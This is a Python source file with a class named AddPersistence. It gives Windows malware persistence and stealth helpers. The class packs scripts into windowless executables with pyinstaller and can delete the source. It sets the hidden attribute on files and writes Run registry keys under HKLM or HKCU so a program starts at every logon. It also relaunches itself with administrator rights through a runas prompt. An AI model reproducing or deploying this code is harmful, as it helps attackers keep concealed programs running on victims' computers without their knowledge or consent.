import win32con, win32api
import os
import winreg
import subprocess
import ctypes
import sys

class AddPersistence(object):
    
    def __init__(self,path):
        self.path=path
        
    def AddToEnviron(self):
        try:
            os.path.join(os.environ["TEMP"],self.path)
        except:
            pass
        return os.environ["TEMP"]+os.sep+os.path.basename(self.path)
    
    def py_to_exe(self,path,delete=False):
        command='pyinstaller --onefile --noconsole' +'"'+path+'"'
        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
        if delete:
            subprocess.Popen('del '+path+' /Y', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
        return path.replace('.pyw','.exe').replace('.py','.exe')
            
        
    def hideFiles(self,path):
        if os.path.isfile(path):
            win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
            return True
        return False
    
    def addPersistence(self,path,name,hiden=False,user=False):
        assert(self.isAdmin()==True)
        if hiden:
            assert(self.hideFiles(path)==True)
        if not user:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        else:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        key.Close()
        return True
    
    def runAs(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            
    def isAdmin(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            return False
        return True 
        
        
        
